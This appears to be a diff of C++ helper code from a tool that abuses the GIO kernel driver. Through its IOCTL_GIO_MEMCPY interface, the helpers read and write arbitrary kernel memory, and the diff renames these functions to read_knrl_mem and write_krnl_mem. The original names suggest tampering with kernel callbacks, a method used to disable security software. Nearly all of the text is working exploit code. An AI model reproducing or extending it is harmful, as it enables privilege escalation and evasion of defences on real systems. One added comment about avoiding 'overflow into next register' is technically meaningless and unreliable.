@@ -75,11 +75,11 @@ void helpers::DeleteService( PWCHAR ServiceName )
 }
 
 uint64_t helpers::ResolveRipRelative( uint64_t instrAddress, int32_t offsetOffset, int instrSize ) {
-    int32_t relOffset = *reinterpret_cast< int32_t* >( instrAddress + offsetOffset );
+    int32_t relOffset = *reinterpret_cast< int32_t* >( instrAddress + offsetOffset ); // 4 byte cast to avoid overflow into next register
     return instrAddress + offsetOffset + sizeof( int32_t ) + relOffset;
 }
 
-NTSTATUS helpers::ReadOriginalCallback( HANDLE DeviceHandle, ULONG64 target, DWORD64& outValue ) {
+NTSTATUS helpers::read_knrl_mem( HANDLE DeviceHandle, ULONG64 target, DWORD64& outValue ) {
     GIOMemcpyInput MemcpyInput{};
     IO_STATUS_BLOCK IoStatusBlock{};
 
@@ -92,7 +92,7 @@ NTSTATUS helpers::ReadOriginalCallback( HANDLE DeviceHandle, ULONG64 target, DWO
         &IoStatusBlock, IOCTL_GIO_MEMCPY, &MemcpyInput, sizeof( MemcpyInput ), nullptr, 0 );
 }
 
-NTSTATUS helpers::WriteCallback( HANDLE DeviceHandle, ULONG64 target, DWORD64 value ) {
+NTSTATUS helpers::write_krnl_mem( HANDLE DeviceHandle, ULONG64 target, DWORD64 value ) {
     GIOMemcpyInput MemcpyInput{};
     IO_STATUS_BLOCK IoStatusBlock{};
 
@@ -132,7 +132,7 @@ NTSTATUS helpers::EnsureDeviceHandle( HANDLE* outHandle, PWSTR LoaderServiceName
     return stat;
 }
 
-NTSTATUS helpers::OpenDeviceHandle( _Out_ PHANDLE DeviceHandle, _In_ BOOLEAN PrintErrors )
+NTSTATUS helpers::OpenDeviceHandle( PHANDLE DeviceHandle, BOOLEAN PrintErrors )
 {
     UNICODE_STRING devName = RTL_CONSTANT_STRING( L"\\Device\\GIO" );
     OBJECT_ATTRIBUTES ObjectAttributes = RTL_CONSTANT_OBJECT_ATTRIBUTES( &devName, OBJ_CASE_INSENSITIVE );
